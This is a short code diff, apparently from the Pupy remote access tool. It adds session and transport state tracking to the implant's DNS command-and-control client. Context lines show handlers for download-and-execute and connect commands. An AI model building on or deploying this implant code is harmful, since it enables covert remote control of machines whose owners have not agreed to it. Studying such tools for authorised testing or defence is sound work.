@@ -29,6 +29,16 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
         DnsCommandsClient.__init__(self, domain, key=key)
 
+    def on_session_established(self):
+        import pupy
+        if hasattr(pupy, 'infos'):
+            pupy.infos['spi'] = '{:08x}'.format(self.spi)
+
+    def on_session_lost(self):
+        import pupy
+        if hasattr(pupy, 'infos'):
+            del pupy.infos['spi']
+
     def on_downloadexec_content(self, url, action, content):
         self.on_pastelink_content(url, action, content)
 
@@ -78,14 +88,20 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         pass
 
     def on_connect(self, ip, port, transport):
+        import pupy
         with self.lock:
             self.commands.append(('connect', ip, port, transport))
             self.new_commands.set()
 
+            pupy.infos['transport'] = transport
+
     def on_disconnect(self):
+        import pupy
         with self.lock:
             if self.stream:
                 self.stream.close()
+
+            pupy.infos['transport'] = ''
 
     def on_exit(self):
         with self.lock:
